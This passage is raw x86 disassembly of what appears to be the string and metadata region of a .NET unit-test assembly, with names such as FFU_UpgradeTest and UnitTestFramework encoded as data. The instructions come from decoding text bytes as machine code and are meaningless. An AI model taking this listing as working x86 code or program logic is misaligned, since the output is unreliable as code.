  402757:	push   eax
  402758:	jb     0x4027c3
  40275a:	outs   dx,BYTE PTR ds:[esi]
  40275b:	je     0x4027b2
  40275d:	jae    0x4027c0
  40275f:	add    BYTE PTR gs:[bx+0x65],al
  402764:	je     0x4027ba
  402766:	push   0x69467369
  40276b:	ins    BYTE PTR es:[edi],dx
  40276c:	gs dec esi
  40276e:	popa   
  40276f:	ins    DWORD PTR es:[edi],dx
  402770:	gs push edi
  402772:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x78457475
  40277a:	je     0x4027e1
  40277c:	outs   dx,BYTE PTR ds:[esi]
  40277d:	jae    0x4027e8
  40277f:	outs   dx,DWORD PTR ds:[esi]
  402780:	outs   dx,BYTE PTR ds:[esi]
  402781:	add    BYTE PTR [esi],ch
  402783:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402787:	add    BYTE PTR [ecx+0x72],ah
  40278a:	addr16 jae 0x40278d
  40278d:	push   ebx
  40278e:	jns    0x402803
  402790:	je     0x4027f7
  402792:	ins    DWORD PTR es:[edi],dx
  402793:	cs push edx
  402795:	jne    0x402805
  402797:	je     0x402802
  402799:	ins    DWORD PTR es:[edi],dx
  40279a:	gs cs push esi
  40279d:	gs jb  0x402813
  4027a0:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  4027a7:	push   esp
  4027a8:	popa   
  4027a9:	jb     0x402812
  4027ab:	gs je  0x4027f4
  4027ae:	jb     0x402811
  4027b0:	ins    DWORD PTR es:[edi],dx
  4027b1:	gs ja  0x402823
  4027b4:	jb     0x402821
  4027b6:	inc    ecx
  4027b7:	je     0x40282d
  4027b9:	jb     0x402824
  4027bb:	bound  esi,QWORD PTR [ebp+0x74]
  4027be:	add    BYTE PTR gs:[ebx+0x79],dl
  4027c2:	jae    0x402838
  4027c4:	gs ins DWORD PTR es:[edi],dx
  4027c6:	cs push edx
  4027c8:	jne    0x402838
  4027ca:	je     0x402835
  4027cc:	ins    DWORD PTR es:[edi],dx
  4027cd:	gs cs dec ecx
  4027d0:	outs   dx,BYTE PTR ds:[esi]
  4027d1:	je     0x402838
  4027d3:	jb     0x402844
  4027d5:	jo     0x40282a
  4027d7:	gs jb  0x402850
  4027da:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4027e1:	ins    DWORD PTR es:[edi],dx
  4027e2:	push   esi
  4027e3:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4027ea:	je     0x402860
  4027ec:	jb     0x402857
  4027ee:	bound  esi,QWORD PTR [ebp+0x74]
  4027f1:	add    BYTE PTR gs:[ebx+0x4c],al
  4027f5:	push   ebx
  4027f6:	inc    ebx
  4027f7:	outs   dx,DWORD PTR ds:[esi]
  4027f8:	ins    DWORD PTR es:[edi],dx
  4027f9:	jo     0x402867
  4027fb:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  402802:	jb     0x40286d
  402804:	bound  esi,QWORD PTR [ebp+0x74]
  402807:	add    BYTE PTR gs:[ebx+0x79],dl
  40280b:	jae    0x402881
  40280d:	gs ins DWORD PTR es:[edi],dx
  40280f:	cs push edx
  402811:	gs data16 ins BYTE PTR es:[edi],dx
  402814:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402819:	outs   dx,BYTE PTR ds:[esi]
  40281a:	add    BYTE PTR [ecx+0x73],al
  40281d:	jae    0x402884
  40281f:	ins    DWORD PTR es:[edi],dx
  402820:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402824:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40282c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402833:	jae    0x4028a8
  402835:	gs ins DWORD PTR es:[edi],dx
  402837:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40283b:	gs jae 0x4028a1
  40283e:	jb     0x4028a9
  402840:	jo     0x4028b6
  402842:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402849:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402850:	jae    0x4028c5
  402852:	gs ins DWORD PTR es:[edi],dx
  402854:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402858:	gs popaw 
  40285b:	jne    0x4028c9
  40285d:	je     0x4028a0
  40285f:	ins    BYTE PTR es:[edi],dx
  402860:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  402867:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40286e:	jae    0x4028e3
  402870:	gs ins DWORD PTR es:[edi],dx
  402872:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402876:	outs   dx,DWORD PTR ds:[esi]
  402877:	ins    DWORD PTR es:[edi],dx
  402878:	jo     0x4028db
  40287a:	outs   dx,BYTE PTR ds:[esi]
  40287b:	jns    0x4028be
  40287d:	je     0x4028f3
  40287f:	jb     0x4028ea
  402881:	bound  esi,QWORD PTR [ebp+0x74]
  402884:	add    BYTE PTR gs:[ecx+0x73],al
  402888:	jae    0x4028ef
  40288a:	ins    DWORD PTR es:[edi],dx
  40288b:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40288f:	jb     0x402900
  402891:	fs jne 0x4028f7
  402894:	je     0x4028d7
  402896:	je     0x40290c
  402898:	jb     0x402903
  40289a:	bound  esi,QWORD PTR [ebp+0x74]
  40289d:	add    BYTE PTR gs:[ecx+0x73],al
  4028a1:	jae    0x402908
  4028a3:	ins    DWORD PTR es:[edi],dx
  4028a4:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4028a8:	outs   dx,DWORD PTR ds:[esi]
  4028a9:	jo     0x402924
  4028ab:	jb     0x402916
  4028ad:	addr16 push 0x74744174
  4028b3:	jb     0x40291e
  4028b5:	bound  esi,QWORD PTR [ebp+0x74]
  4028b8:	add    BYTE PTR gs:[ecx+0x73],al
  4028bc:	jae    0x402923
  4028be:	ins    DWORD PTR es:[edi],dx
  4028bf:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4028c3:	gs jb  0x402939
  4028c6:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4028cd:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4028d4:	jae    0x402949
  4028d6:	gs ins DWORD PTR es:[edi],dx
  4028d8:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4028dc:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4028e4:	outs   dx,DWORD PTR ds:[esi]
  4028e5:	outs   dx,BYTE PTR ds:[esi]
  4028e6:	inc    ecx
  4028e7:	je     0x40295d
  4028e9:	jb     0x402954
  4028eb:	bound  esi,QWORD PTR [ebp+0x74]
  4028ee:	add    BYTE PTR gs:[ecx+0x73],al
  4028f2:	jae    0x402959
  4028f4:	ins    DWORD PTR es:[edi],dx
  4028f5:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4028f9:	outs   dx,BYTE PTR ds:[esi]
  4028fa:	outs   dx,WORD PTR ds:[esi]
  4028fc:	jb     0x40296b
  4028fe:	popa   
  4028ff:	je     0x40296a
  402901:	outs   dx,DWORD PTR ds:[esi]
  402902:	outs   dx,BYTE PTR ds:[esi]
  402903:	popa   
  402904:	ins    BYTE PTR es:[edi],dx
  402905:	push   esi
  402906:	gs jb  0x40297c
  402909:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402910:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402917:	jns    0x40298c
  402919:	je     0x402980
  40291b:	ins    DWORD PTR es:[edi],dx
  40291c:	cs push edx
  40291e:	gs jae 0x402990
  402921:	jne    0x402995
  402923:	arpl   WORD PTR [ebp+0x73],sp
  402926:	add    BYTE PTR [ebx+0x61],dl
  402929:	je     0x402990
  40292b:	ins    BYTE PTR es:[edi],dx
  40292c:	ins    BYTE PTR es:[edi],dx
  40292d:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  402935:	popa   
  402936:	arpl   WORD PTR [esi+edx*2+0x65],si
  40293a:	jb     0x4029af
  40293c:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402943:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  40294a:	gs jne 0x4029c1
  40294d:	jb     0x4029b0
  40294f:	ins    BYTE PTR es:[edi],dx
  402950:	push   edx
  402951:	gs jae 0x4029c3
  402954:	jne    0x4029c8
  402956:	arpl   WORD PTR [ebp+0x73],sp
  402959:	dec    esp
  40295a:	popa   
  40295b:	outs   dx,BYTE PTR ds:[esi]
  40295c:	addr16 jne 0x4029c0
  40295f:	addr16 gs inc ecx
  402962:	je     0x4029d8
  402964:	jb     0x4029cf
  402966:	bound  esi,QWORD PTR [ebp+0x74]
  402969:	add    BYTE PTR gs:[ecx+0x73],al
  40296d:	jae    0x4029d4
  40296f:	ins    DWORD PTR es:[edi],dx
  402970:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402974:	gs ins BYTE PTR es:[edi],dx
  402976:	popa   
  402977:	jns    0x4029cc
  402979:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402980:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402987:	jae    0x4029fc
  402989:	gs ins DWORD PTR es:[edi],dx
  40298b:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  40298f:	gs jns 0x4029d8
  402992:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40299a:	bound  esi,QWORD PTR [ebp+0x74]
  40299d:	add    BYTE PTR gs:[ecx+0x73],al
  4029a1:	jae    0x402a08
  4029a3:	ins    DWORD PTR es:[edi],dx
  4029a4:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  4029a8:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  4029af:	gs dec ebx
  4029b1:	gs jns 0x4029f5
  4029b4:	je     0x402a2a
  4029b6:	jb     0x402a21
  4029b8:	bound  esi,QWORD PTR [ebp+0x74]
  4029bb:	add    BYTE PTR gs:[ebx+0x79],dl
  4029bf:	jae    0x402a35
  4029c1:	gs ins DWORD PTR es:[edi],dx
  4029c3:	cs push edx
  4029c5:	jne    0x402a35
  4029c7:	je     0x402a32
  4029c9:	ins    DWORD PTR es:[edi],dx
  4029ca:	gs cs inc ebx
  4029cd:	outs   dx,DWORD PTR ds:[esi]
  4029ce:	ins    DWORD PTR es:[edi],dx
  4029cf:	jo     0x402a3a
  4029d1:	ins    BYTE PTR es:[edi],dx
  4029d2:	gs jb  0x402a28
  4029d5:	gs jb  0x402a4e
  4029d8:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  4029df:	outs   dx,BYTE PTR ds:[esi]
  4029e0:	je     0x402a4b
  4029e2:	ins    DWORD PTR es:[edi],dx
  4029e3:	gs inc ebx
  4029e5:	outs   dx,DWORD PTR ds:[esi]
  4029e6:	ins    DWORD PTR es:[edi],dx
  4029e7:	jo     0x402a4a
  4029e9:	je     0x402a54
  4029eb:	bound  ebp,QWORD PTR [ecx+0x6c]
  4029ee:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4029f6:	bound  esi,QWORD PTR [ebp+0x74]
  4029f9:	add    BYTE PTR gs:[ebx+0x79],dl
  4029fd:	jae    0x402a73
  4029ff:	gs ins DWORD PTR es:[edi],dx
  402a01:	cs inc esp
  402a03:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402a0a:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  402a11:	jne    0x402a7a
  402a13:	addr16 popa 
  402a15:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  402a19:	je     0x402a8f
  402a1b:	jb     0x402a86
  402a1d:	bound  esi,QWORD PTR [ebp+0x74]
  402a20:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  402a25:	jne    0x402a8e
  402a27:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  402a2f:	jae    0x402a31
  402a31:	inc    ebx
  402a32:	outs   dx,DWORD PTR ds:[esi]
  402a33:	ins    DWORD PTR es:[edi],dx
  402a34:	jo     0x402a9f
  402a36:	ins    BYTE PTR es:[edi],dx
  402a37:	popa   
  402a38:	je     0x402aa3
  402a3a:	outs   dx,DWORD PTR ds:[esi]
  402a3b:	outs   dx,BYTE PTR ds:[esi]
  402a3c:	push   edx
  402a3d:	gs ins BYTE PTR es:[edi],dx
  402a3f:	popa   
  402a40:	js     0x402aa3
  402a42:	je     0x402aad
  402a44:	outs   dx,DWORD PTR ds:[esi]
  402a45:	outs   dx,BYTE PTR ds:[esi]
  402a46:	jae    0x402a89
  402a48:	je     0x402abe
  402a4a:	jb     0x402ab5
  402a4c:	bound  esi,QWORD PTR [ebp+0x74]
  402a4f:	add    BYTE PTR gs:[esi+0x53],dl
  402a53:	push   esp
  402a54:	push   ebx
  402a55:	push   esp
  402a56:	sub    eax,0x656c6946
  402a5b:	inc    ebx
  402a5c:	outs   dx,DWORD PTR ds:[esi]
  402a5d:	outs   dx,BYTE PTR ds:[esi]
  402a5e:	jbe    0x402ac5
  402a60:	jb     0x402ad6
  402a62:	gs jb  0x402a65
  402a65:	dec    ebp
  402a66:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402a6d:	je     0x402a9d
  402a6f:	push   esi
  402a70:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402a77:	jne    0x402add
  402a79:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  402a80:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  402a88:	cs push edx
  402a8a:	gs jae 0x402afc
  402a8d:	jne    0x402b01
  402a8f:	arpl   WORD PTR [ebp+0x0],sp
  402a92:	dec    ebp
  402a93:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402a9a:	je     0x402aca
  402a9c:	push   esi
  402a9d:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402aa4:	jne    0x402b0a
  402aa6:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  402aad:	push   esp
  402aae:	outs   dx,DWORD PTR ds:[esi]
  402aaf:	outs   dx,DWORD PTR ds:[esi]
  402ab0:	ins    BYTE PTR es:[edi],dx
  402ab1:	jae    0x402ae1
  402ab3:	push   edx
  402ab4:	gs jae 0x402b26
  402ab7:	jne    0x402b2b
  402ab9:	arpl   WORD PTR [ebp+0x73],sp
  402abc:	add    BYTE PTR [ebp+0x65],cl
  402abf:	jae    0x402b34
  402ac1:	popa   
  402ac2:	addr16 gs jae 0x402ac6
  402ac6:	inc    ebp
  402ac7:	jno    0x402b3d
  402ac9:	dec    ebp
  402aca:	gs jae 0x402b40
  402acd:	popa   
  402ace:	add    BYTE PTR gs:[bp+0x46],al
  402ad3:	push   ebp
  402ad4:	pop    edi
  402ad5:	inc    ebp
  402ad6:	jb     0x402b4a
  402ad8:	outs   dx,DWORD PTR ds:[esi]
  402ad9:	jb     0x402b24
  402adb:	outs   dx,BYTE PTR ds:[esi]
  402adc:	jo     0x402b53
  402ade:	je     0x402ae0
  402ae0:	outs   dx,DWORD PTR ds:[esi]
  402ae1:	jo     0x402b42
  402ae3:	dec    ecx
  402ae4:	ins    DWORD PTR es:[edi],dx
  402ae5:	jo     0x402b53
  402ae7:	imul   esp,DWORD PTR [ebx+0x69],0x6f430074
  402aee:	outs   dx,BYTE PTR ds:[esi]
  402aef:	jae    0x402b60
  402af1:	ins    BYTE PTR es:[edi],dx
  402af2:	add    BYTE PTR gs:[edi+0x72],dl
  402af6:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  402afe:	push   ebx
  402aff:	je     0x402b73
  402b01:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  402b08:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  402b0f:	popa   
  402b10:	jb     0x402b7b
  402b12:	jae    0x402b83
  402b14:	outs   dx,BYTE PTR ds:[esi]
  402b15:	add    BYTE PTR [ebp+0x71],al
  402b18:	jne    0x402b7b
  402b1a:	ins    BYTE PTR es:[edi],dx
  402b1b:	jae    0x402b1d
  402b1d:	push   ebx
  402b1e:	jns    0x402b93
  402b20:	je     0x402b87
  402b22:	ins    DWORD PTR es:[edi],dx
  402b23:	cs dec ecx
  402b25:	dec    edi
  402b26:	add    BYTE PTR [esi+0x69],al
  402b29:	ins    BYTE PTR es:[edi],dx
  402b2a:	add    BYTE PTR gs:[ebp+0x78],al
  402b2e:	imul   esi,DWORD PTR [ebx+0x74],0x46460073
  402b35:	push   ebp
  402b36:	pop    edi
  402b37:	inc    ebx
  402b38:	popa   
  402b39:	outs   dx,BYTE PTR ds:[esi]
  402b3a:	outs   dx,BYTE PTR ds:[esi]
  402b3b:	outs   dx,DWORD PTR ds:[esi]
  402b3c:	je     0x402b84
  402b3e:	imul   ebp,DWORD PTR [esi+0x64],0x75706e49
  402b45:	je     0x402b8d
  402b47:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f554646
  402b4f:	push   ebx
  402b50:	je     0x402bb3
  402b52:	jb     0x402bc8
  402b54:	imul   ebp,DWORD PTR [esi+0x67],0x72677055
  402b5b:	popa   
  402b5c:	fs add BYTE PTR gs:[ebp+0x69],cl
  402b61:	arpl   WORD PTR [edx+0x6f],si
  402b64:	jae    0x402bd5
  402b66:	data16 je 0x402b97
  402b69:	push   esi
  402b6a:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402b71:	jne    0x402bd7
  402b73:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  402b7a:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  402b82:	cs inc ebx
  402b84:	outs   dx,DWORD PTR ds:[esi]
  402b85:	ins    DWORD PTR es:[edi],dx
  402b86:	ins    DWORD PTR es:[edi],dx
  402b87:	outs   dx,DWORD PTR ds:[esi]
  402b88:	outs   dx,BYTE PTR ds:[esi]
  402b89:	add    BYTE PTR [ebp+0x69],cl
  402b8c:	arpl   WORD PTR [edx+0x6f],si
  402b8f:	jae    0x402c00
  402b91:	data16 je 0x402bc2
  402b94:	push   esi
  402b95:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402b9c:	jne    0x402c02
  402b9e:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  402ba5:	push   esp
  402ba6:	outs   dx,DWORD PTR ds:[esi]
  402ba7:	outs   dx,DWORD PTR ds:[esi]
  402ba8:	ins    BYTE PTR es:[edi],dx
  402ba9:	jae    0x402bd9
  402bab:	inc    ebx
  402bac:	outs   dx,DWORD PTR ds:[esi]
  402bad:	ins    DWORD PTR es:[edi],dx
  402bae:	ins    DWORD PTR es:[edi],dx
  402baf:	outs   dx,DWORD PTR ds:[esi]
  402bb0:	outs   dx,BYTE PTR ds:[esi]
  402bb1:	cs pop eax
  402bb3:	ins    DWORD PTR es:[edi],dx
  402bb4:	ins    BYTE PTR es:[edi],dx
  402bb5:	add    BYTE PTR [ebp+eiz*2+0x73],dl
  402bb9:	je     0x402c01
  402bbb:	outs   dx,DWORD PTR ds:[esi]
  402bbc:	jb     0x402c2b
  402bbe:	popa   
  402bbf:	je     0x402c34
  402bc1:	inc    ebx
  402bc2:	outs   dx,DWORD PTR ds:[esi]
  402bc3:	outs   dx,BYTE PTR ds:[esi]
  402bc4:	jbe    0x402c2b
  402bc6:	jb     0x402c3c
  402bc8:	gs jb  0x402bcb
  402bcb:	inc    ebx
  402bcc:	outs   dx,DWORD PTR ds:[esi]
  402bcd:	outs   dx,BYTE PTR ds:[esi]
  402bce:	jbe    0x402c35
  402bd0:	jb     0x402c46
  402bd2:	inc    esi
  402bd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f746567
  402bdb:	inc    esi
  402bdc:	inc    esi
  402bdd:	push   ebp
  402bde:	pop    edi
  402bdf:	push   ebp
  402be0:	jo     0x402c49
  402be2:	jb     0x402c45
  402be4:	fs gs inc ebx
  402be7:	outs   dx,DWORD PTR ds:[esi]
  402be8:	ins    DWORD PTR es:[edi],dx
  402be9:	jo     0x402c57
  402beb:	gs je  0x402c53
  402bee:	add    BYTE PTR fs:[edi+0x65],ah
  402bf2:	je     0x402c53
  402bf4:	inc    esi
  402bf5:	inc    esi
  402bf6:	push   ebp
  402bf7:	pop    edi
  402bf8:	push   ebp
  402bf9:	jo     0x402c62
  402bfb:	jb     0x402c5e
  402bfd:	fs gs dec esi
  402c00:	outs   dx,DWORD PTR ds:[esi]
  402c01:	je     0x402c51
  402c03:	gs gs fs gs add BYTE PTR fs:[ebp+0x78],al
  402c0b:	arpl   WORD PTR [ebp+0x70],sp
  402c0e:	je     0x402c79
  402c10:	outs   dx,DWORD PTR ds:[esi]
  402c11:	outs   dx,BYTE PTR ds:[esi]
  402c12:	add    BYTE PTR [edi+0x65],ah
  402c15:	je     0x402c76
  402c17:	dec    ebp
  402c18:	gs jae 0x402c8e
  402c1b:	popa   
  402c1c:	add    BYTE PTR gs:[bp+0x46],al
  402c21:	push   ebp
  402c22:	pop    edi
  402c23:	inc    edi
  402c24:	outs   dx,BYTE PTR gs:[esi]
  402c26:	gs jb  0x402c92
  402c29:	arpl   WORD PTR [esi+0x61],ax
  402c2c:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x73410065
  402c34:	jae    0x402c9b
  402c36:	ins    DWORD PTR es:[edi],dx
  402c37:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  402c3b:	inc    edi
  402c3c:	gs je  0x402c84
  402c3f:	js     0x402ca6
  402c41:	arpl   WORD PTR [ebp+0x74],si
  402c44:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  402c4b:	ins    DWORD PTR es:[edi],dx
  402c4c:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  402c50:	addr16 gs je 0x402cb3
  402c54:	dec    esp
  402c55:	outs   dx,DWORD PTR ds:[esi]
  402c56:	arpl   WORD PTR [ecx+0x74],sp
  402c59:	imul   ebp,DWORD PTR [edi+0x6e],0x6c694600
  402c60:	gs push esi
  402c62:	gs jb  0x402cd8
  402c65:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  402c6c:	add    BYTE PTR [edi+0x65],al
  402c6f:	je     0x402cc7
  402c71:	gs jb  0x402ce7
  402c74:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  402c7b:	add    BYTE PTR [edi+0x65],ah
  402c7e:	je     0x402cdf
  402c80:	inc    esi
  402c81:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402c89:	outs   dx,DWORD PTR ds:[esi]
  402c8a:	outs   dx,BYTE PTR ds:[esi]
  402c8b:	add    BYTE PTR [esi+0x46],al
  402c8e:	push   ebp
  402c8f:	pop    edi
  402c90:	dec    eax
  402c91:	gs popa 
  402c93:	fs gs jb 0x402c97
  402c97:	inc    esi
  402c98:	inc    esi
  402c99:	push   ebp
  402c9a:	pop    edi
  402c9b:	push   ebp
  402c9c:	jae    0x402cff
  402c9e:	add    BYTE PTR gs:[bx+si+0x61],dl
  402ca3:	je     0x402d0d
  402ca5:	add    BYTE PTR [edi+0x65],al
  402ca8:	je     0x402cf0
  402caa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  402cb2:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x78457475
  402cba:	je     0x402d21
  402cbc:	outs   dx,BYTE PTR ds:[esi]
  402cbd:	jae    0x402d28
  402cbf:	outs   dx,DWORD PTR ds:[esi]
  402cc0:	outs   dx,BYTE PTR ds:[esi]
  402cc1:	add    BYTE PTR [esi],ch
  402cc3:	arpl   WORD PTR [ebx+0x74],sp
  402cc6:	outs   dx,DWORD PTR ds:[esi]
  402cc7:	jb     0x402cc9
  402cc9:	add    BYTE PTR [eax],al
  402ccb:	add    BYTE PTR [eax],al
  402ccd:	or     ebp,DWORD PTR [edi]
  402ccf:	add    BYTE PTR [eax+0x0],ch
  402cd2:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  402cd7:	add    BYTE PTR [eax],al
  402cd9:	add    eax,0x68002f
  402cde:	add    BYTE PTR ds:0x3f002f,al
  402ce4:	add    BYTE PTR [eax],al
  402ce6:	add    BYTE PTR [eax],al
  402ce8:	scas   al,BYTE PTR es:[edi]
  402ce9:	shl    BYTE PTR [eax+0x1],0xcb
  402ced:	enter  0x463f,0xb5
  402cf1:	cwde   
  402cf2:	clc    
  402cf3:	jbe    0x402d36
  402cf5:	inc    eax
  402cf6:	cwde   
  402cf7:	data16 add BYTE PTR [eax],cl
  402cfa:	mov    bh,0x7a
  402cfc:	pop    esp
  402cfd:	push   esi
  402cfe:	sbb    DWORD PTR [eax+eiz*8],esi
  402d01:	mov    DWORD PTR [ebx],eax
  402d03:	push   es
  402d04:	sbb    eax,0x100050e
  402d09:	or     BYTE PTR ds:0x30e,bl
  402d0f:	add    DWORD PTR [ebx],eax
  402d11:	add    BYTE PTR [eax],al
  402d13:	push   cs
  402d14:	add    esp,DWORD PTR [eax]
  402d16:	add    BYTE PTR [ecx],al
  402d18:	add    al,0x20
  402d1a:	add    DWORD PTR [ecx],eax
  402d1c:	push   cs
  402d1d:	add    al,0x20
  402d1f:	add    DWORD PTR [ecx],eax
  402d21:	add    al,BYTE PTR ds:0xe010220
  402d27:	push   cs
  402d28:	add    eax,0x11010120
  402d2d:	push   ebp
  402d2e:	add    al,0x20
  402d30:	add    DWORD PTR [ecx],eax
  402d32:	or     BYTE PTR [eax+0x2400a0],al
  402d38:	add    BYTE PTR [eax+eax*4],al
  402d3b:	add    BYTE PTR [eax],al
  402d3d:	xchg   esp,eax
  402d3e:	add    BYTE PTR [eax],al
  402d40:	add    BYTE PTR [esi],al
  402d42:	add    al,BYTE PTR [eax]
  402d44:	add    BYTE PTR [eax],al
  402d46:	and    al,0x0
  402d48:	add    BYTE PTR [edx+0x53],dl
  402d4b:	inc    ecx
  402d4c:	xor    DWORD PTR [eax],eax
  402d4e:	add    al,0x0
  402d50:	add    BYTE PTR [ecx],al
  402d52:	add    BYTE PTR [ecx],al
  402d54:	add    BYTE PTR [edi],al
  402d56:	sar    edx,1
  402d58:	push   edi
  402d59:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  402d5f:	test   BYTE PTR [edx+0xdfdae0f],ch
  402d65:	jmp    0xecab2b52
  402d6a:	pop    DWORD PTR [edi+0x6c7603fb]
  402d70:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  402d75:	mov    dl,0x3b
  402d77:	out    0x9a,eax
  402d79:	(bad)  
  402d7b:	fadd   st(1),st
  402d7d:	fstp   QWORD PTR [edx+0x211336d2]
  402d83:	add    dl,BYTE PTR [eax-0x6c38df5]
  402d89:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  402d90:	pop    esi
  402d92:	pop    es
  402d93:	ja     0x402de4
  402d95:	sub    eax,ebp
  402d97:	xor    cl,BYTE PTR [esi]
  402d99:	xchg   edx,eax
  402d9a:	jmp    0xc021:0xe8e4ec05
  402da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da2:	out    dx,eax
  402da3:	call   0x4c9c9299
  402da8:	or     al,0x93
  402daa:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  402db1:	stos   BYTE PTR es:[edi],al
  402db2:	gs sub al,0x1d
  402db5:	cli    
  402db6:	(bad)  
  402db7:	cmp    eax,0x2d6f5d74
  402dbc:	in     eax,0xf1
  402dbe:	jle    0x402e1e
  402dc0:	scas   eax,DWORD PTR es:[edi]
  402dc1:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  402dc9:	inc    ebx
  402dca:	sbb    BYTE PTR gs:[eax],ah
  402dcd:	ins    DWORD PTR es:[edi],dx
  402dce:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  402dd5:	or     BYTE PTR [eax+0x117f5f3f],dh
  402ddb:	aad    0xa
  402ddd:	cmp    al,BYTE PTR ds:0x61120100
  402de3:	sbb    al,0x5
  402de5:	add    BYTE PTR [ecx],al
  402de7:	push   cs
  402de8:	adc    ah,BYTE PTR [ecx+0x4]
  402deb:	add    BYTE PTR [ecx],al
  402ded:	add    DWORD PTR [esi],ecx
  402def:	pop    es
  402df0:	add    BYTE PTR [ebx],al
  402df2:	add    cl,BYTE PTR [esi]
  402df4:	push   cs
  402df5:	adc    DWORD PTR [ebp+0x4],ebp
  402df8:	add    BYTE PTR [ecx],al
  402dfa:	add    cl,BYTE PTR [esi]
  402dfc:	push   es
  402dfd:	add    BYTE PTR [edx],al
  402dff:	adc    ah,BYTE PTR [ecx+0x1c]
  402e02:	sbb    al,0x5
  402e04:	add    BYTE PTR [edx],al
  402e06:	add    cl,BYTE PTR [esi]
  402e08:	push   cs
  402e09:	add    al,0x0
  402e0b:	add    BYTE PTR [edx],dl
  402e0d:	popa   
  402e0e:	add    esp,DWORD PTR [eax]
  402e10:	add    BYTE PTR [esi],cl
  402e12:	or     eax,DWORD PTR [edi]
  402e14:	pop    es
  402e15:	push   cs
  402e16:	push   cs
  402e17:	push   cs
  402e18:	adc    bh,BYTE PTR [ecx+0x8]
  402e1b:	sbb    eax,0x4080e
  402e20:	add    BYTE PTR [edx],dl
  402e22:	jge    0x402e2a
  402e24:	add    BYTE PTR [ecx],al
  402e26:	adc    al,BYTE PTR [eax+0x7050e81]
  402e2c:	add    DWORD PTR [edx],edx
  402e2e:	add    BYTE PTR [ecx+0xe010004],0xe
  402e35:	add    al,0x7
  402e37:	add    DWORD PTR ds:0x1370e,ebx
  402e3d:	sbb    ch,BYTE PTR [esi]
  402e3f:	dec    esi
  402e40:	inc    ebp
  402e41:	push   esp
  402e42:	inc    esi
  402e43:	jb     0x402ea6
  402e45:	ins    DWORD PTR es:[edi],dx
  402e46:	gs ja  0x402eb8
  402e49:	jb     0x402eb6
  402e4b:	sub    al,0x56
